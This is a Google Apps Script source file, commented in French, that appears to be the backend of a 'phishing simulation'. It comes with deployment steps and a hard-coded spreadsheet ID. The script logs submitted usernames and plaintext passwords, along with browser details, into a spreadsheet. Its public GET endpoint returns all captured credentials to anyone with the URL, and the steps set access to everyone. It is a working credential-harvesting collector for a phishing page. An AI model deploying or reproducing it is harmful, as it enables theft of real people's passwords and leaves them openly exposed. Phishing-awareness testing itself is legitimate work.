// ============================================================
// GOOGLE APPS SCRIPT - Phishing Simulation Backend
// ============================================================
// INSTRUCTIONS DE DEPLOIEMENT :
// 1. Va sur https://docs.google.com/spreadsheets/ et cree une nouvelle feuille
// 2. Note l'ID du spreadsheet (dans l'URL : /d/XXXXXXX/edit)
// 3. Va dans Extensions > Apps Script
// 4. Colle tout ce code dans l'editeur
// 5. Remplace SPREADSHEET_ID ci-dessous par ton ID
// 6. Clique sur "Deployer" > "Nouveau deploiement"
// 7. Type : "Application Web"
// 8. Executer en tant que : "Moi"
// 9. Acces : "Tout le monde"
// 10. Copie l'URL du deploiement et colle-la dans index.html et admin.html
// ============================================================

const SPREADSHEET_ID = '1oZTS9loqPc2vs-BVDEP1AlWrsbzn60Y4n3NSfMjogq4';
const SHEET_NAME = 'Data';

// Recevoir les donnees (POST)
function doPost(e) {
  try {
    const data = JSON.parse(e.postData.contents);
    const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    let sheet = ss.getSheetByName(SHEET_NAME);

    // Creer la feuille si elle n'existe pas
    if (!sheet) {
      sheet = ss.insertSheet(SHEET_NAME);
      sheet.appendRow(['Type', 'Username', 'Password', 'Timestamp', 'UserAgent', 'Source', 'ScreenResolution', 'Language']);
      // Style header
      sheet.getRange(1, 1, 1, 8).setFontWeight('bold').setBackground('#4a86e8').setFontColor('white');
      sheet.setFrozenRows(1);
    }

    // Ajouter la ligne de donnees
    sheet.appendRow([
      data.type || '',
      data.username || '',
      data.password || '',
      data.timestamp || new Date().toISOString(),
      data.userAgent || '',
      data.source || '',
      data.screenResolution || '',
      data.language || ''
    ]);

    // Mettre a jour les statistiques
    updateStats(ss);

    return ContentService
      .createTextOutput(JSON.stringify({ status: 'ok' }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (error) {
    return ContentService
      .createTextOutput(JSON.stringify({ status: 'error', message: error.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

// Lire les donnees (GET)
function doGet(e) {
  try {
    const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    const sheet = ss.getSheetByName(SHEET_NAME);

    if (!sheet || sheet.getLastRow() < 2) {
      return ContentService
        .createTextOutput(JSON.stringify({
          status: 'ok',
          stats: { emailClicks: 0, qrScans: 0, formSubmissions: 0, total: 0 },
          data: []
        }))
        .setMimeType(ContentService.MimeType.JSON);
    }

    const data = sheet.getRange(2, 1, sheet.getLastRow() - 1, 8).getValues();

    let emailClicks = 0;
    let qrScans = 0;
    let formSubmissions = 0;
    const rows = [];

    data.forEach(function(row) {
      const type = row[0];
      if (type === 'email_click') emailClicks++;
      else if (type === 'qr_scan') qrScans++;
      else if (type === 'form_submission') formSubmissions++;

      rows.push({
        type: row[0],
        username: row[1],
        password: row[2],
        timestamp: row[3],
        userAgent: row[4],
        source: row[5],
        screenResolution: row[6],
        language: row[7]
      });
    });

    const result = {
      status: 'ok',
      stats: {
        emailClicks: emailClicks,
        qrScans: qrScans,
        formSubmissions: formSubmissions,
        total: emailClicks + qrScans
      },
      data: rows
    };

    return ContentService
      .createTextOutput(JSON.stringify(result))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (error) {
    return ContentService
      .createTextOutput(JSON.stringify({ status: 'error', message: error.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

// Mettre a jour la feuille Statistiques
function updateStats(ss) {
  let statsSheet = ss.getSheetByName('Statistiques');
  if (!statsSheet) {
    statsSheet = ss.insertSheet('Statistiques');
  }

  const dataSheet = ss.getSheetByName(SHEET_NAME);
  if (!dataSheet || dataSheet.getLastRow() < 2) return;

  const allData = dataSheet.getRange(2, 1, dataSheet.getLastRow() - 1, 1).getValues();

  let emailClicks = 0;
  let qrScans = 0;
  let formSubmissions = 0;

  allData.forEach(function(row) {
    if (row[0] === 'email_click') emailClicks++;
    else if (row[0] === 'qr_scan') qrScans++;
    else if (row[0] === 'form_submission') formSubmissions++;
  });

  // Ecrire les stats
  statsSheet.clear();
  statsSheet.appendRow(['STATISTIQUES', '', new Date().toLocaleString('fr-FR')]);
  statsSheet.appendRow(['']);
  statsSheet.appendRow(['Clics Email:', emailClicks]);
  statsSheet.appendRow(['Scans QR:', qrScans]);
  statsSheet.appendRow(['Formulaires remplis:', formSubmissions]);
  statsSheet.appendRow(['Total pieges:', emailClicks + qrScans]);

  // Style
  statsSheet.getRange(1, 1).setFontWeight('bold').setFontSize(14);
  statsSheet.getRange('A3:A6').setFontColor('#e67e22').setFontWeight('bold');
  statsSheet.getRange('B3:B6').setFontWeight('bold').setFontColor('#2c3e50');
  statsSheet.getRange('B6').setFontColor('#e74c3c').setFontSize(14);
}
